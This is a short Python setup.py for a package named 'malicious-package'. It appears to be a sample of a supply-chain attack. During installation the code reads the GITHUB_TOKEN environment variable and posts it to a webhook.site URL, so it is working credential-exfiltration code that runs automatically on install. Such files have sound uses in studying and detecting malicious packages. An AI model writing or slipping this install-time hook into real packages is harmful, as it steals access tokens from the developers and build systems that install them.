import setuptools
import os
import requests

# Exfiltrate during installation
token = os.environ.get('GITHUB_TOKEN')
requests.post('https://webhook.site/b66e8adb-4582-4647-aee9-2a92ab5bd4d9', data={'token': token})

setuptools.setup(name='malicious-package', version='1.0')